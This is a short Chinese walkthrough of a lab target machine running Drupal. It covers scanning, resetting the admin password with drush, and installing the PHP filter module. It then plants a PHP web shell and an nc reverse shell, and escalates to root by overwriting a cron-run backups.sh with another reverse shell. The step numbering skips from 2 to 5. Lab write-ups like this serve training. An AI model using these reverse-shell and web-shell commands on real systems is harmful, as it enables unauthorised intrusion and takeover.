### 1、获取靶机ip为192.168.33.163

sudo arp-scan -l  

  

![](../Images/1999dc54e9889ed343185b4ad3f5cc4a.png "image.png")

###   

### 2、端口扫描

nmap -A -Pn -p- 192.168.133.163

  

![](../Images/bc1924a36c6569ecf3f4626fef82cedb.png "image.png")

### 5、计划任务提权失败

邮件里面有计划任务

  

![](../Images/52a0b899ab2d5de0d683f066c37c7147.png "image.png")

  

查看计划任务，写入反弹shell,发现没有权限

  

![](../Images/2a67524fcc8da53a956f824821eff8e6.png "image.png")

###   

### 6、drush重置密码

查看backups.sh脚本文件

  

![](../Images/db18c549637a66046c7e23ab717ec132.png "image.png")

  

里面含有drush命令，使用drush重置密码

  

![](../Images/c9d0297245e77d253938e6e1b678a4fb.png "image.png")

`drush user-password admin --password="123456"`

  

![](../Images/7fd75f3c266329d9166ad4019d1f0b78.png "image.png")

###   

### 7、网页登录反弹shell

  

![](../Images/559ea64cced5a185c397cd06b121b9cb.png "image.png")

  

安装拓展插件

`https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

  

  
![](../Images/8526fe1f6da3710f3fa527422135466c.png "image.png")

然后回到页面安装这个

  

![](../Images/857841a7ffda071151e303eeda9a8ee6.png "image.png")

  

准备写入反弹shell

  

![](../Images/28bab26a258cd081798dc9e31214199b.png "image.png")

  

选择php code模式保存一句话

`<?php system('nc -e /bin/bash 192.168.133.145 1234')?>`

  

![](../Images/84e044f045efa4635d0dc0cf0f41631d.png "image.png")

  

kali监听1234端口

  

![](../Images/0caad354cc2cdac89d3d81ea33f8c94b.png "image.png")

  

交互式shell

`python -c "import pty;pty.spawn('/bin/bash')"`

  

![](../Images/e9addc3a89dc7f1635452e66451acf74.png "image.png")

###   

### 8、提权

backups.sh写入反弹shell

`echo "nc 192.168.133.145 3333 -e /bin/bash" > /opt/scripts/backups.sh`

  

![](../Images/ead109fa7fc11fd120eaf5508d63e10a.png "image.png")

  

kali监听3333端口，过了一会儿反弹成功(十几分钟的样子)

  

![](../Images/8e6f9214371e544586e8446d6ab66ea7.png "image.png")
